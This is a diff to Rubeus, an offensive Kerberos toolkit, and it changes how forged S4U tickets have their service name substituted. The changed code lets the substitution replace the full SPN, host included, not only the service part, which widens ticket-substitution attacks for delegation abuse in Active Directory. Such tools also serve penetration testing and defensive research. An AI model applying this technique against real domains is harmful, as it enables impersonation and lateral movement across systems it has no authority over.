@@ -252,7 +252,16 @@ namespace Rubeus
                         KRB_CRED cred = new KRB_CRED();
 
                         // since we want an alternate sname, first substitute it into the ticket structure
-                        rep2.ticket.sname.name_string[0] = altSname;
+                        // substitue the entire SPN if altservice provides the hostname, otherwise swap the service only
+                        if (altSname.Contains("/"))
+                        {
+                            rep2.ticket.sname.name_string.Clear();
+                            rep2.ticket.sname.name_string.AddRange(altSname.Split('/'));
+                        }
+                        else
+                        {
+                            rep2.ticket.sname.name_string[0] = altSname;
+                        }
 
                         // add the ticket
                         cred.tickets.Add(rep2.ticket);
@@ -295,7 +304,15 @@ namespace Rubeus
 
                         // if we want an alternate sname, substitute it into the encrypted portion of the KRB_CRED
                         Console.WriteLine("[*] Substituting alternative service name '{0}'", altSname);
-                        info.sname.name_string[0] = altSname;
+                        if (altSname.Contains("/"))
+                        {
+                            info.sname.name_string.Clear();
+                            info.sname.name_string.AddRange(altSname.Split('/'));
+                        }
+                        else
+                        {
+                            info.sname.name_string[0] = altSname;
+                        }
 
                         // add the ticket_info into the cred object
                         cred.enc_part.ticket_info.Add(info);
@@ -344,7 +361,15 @@ namespace Rubeus
                     // if we want an alternate sname, first substitute it into the ticket structure
                     if (!String.IsNullOrEmpty(altService))
                     {
-                        rep2.ticket.sname.name_string[0] = altService;
+                        if (altService.Contains("/"))
+                        {
+                            rep2.ticket.sname.name_string.Clear();
+                            rep2.ticket.sname.name_string.AddRange(altService.Split('/'));
+                        }
+                        else
+                        {
+                            rep2.ticket.sname.name_string[0] = altService;
+                        }
                     }
 
                     // add the ticket
